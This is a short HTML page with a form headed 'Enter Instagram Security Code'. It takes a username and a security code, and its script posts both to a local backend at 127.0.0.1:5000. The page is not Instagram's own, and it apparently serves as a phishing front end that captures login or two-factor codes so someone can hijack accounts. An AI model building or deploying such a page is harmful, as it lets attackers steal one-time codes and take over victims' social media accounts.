<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Submit Security Code</title>
</head>
<body>
    <h1>Enter Instagram Security Code</h1>
    <form id="code-form">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required><br><br>
        
        <label for="code">Security Code:</label>
        <input type="text" id="code" name="code" required><br><br>
        
        <button type="submit">Submit</button>
    </form>

    <script>
        document.getElementById("code-form").addEventListener("submit", async function (event) {
            event.preventDefault();
            
            const username = document.getElementById("username").value;
            const code = document.getElementById("code").value;

            const response = await fetch('http://127.0.0.1:5000/submit_code', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username, code })
            });

            if (response.ok) {
                alert("Code submitted successfully!");
            } else {
                alert("Failed to submit the code. Please try again.");
            }
        });
    </script>
</body>
</html>
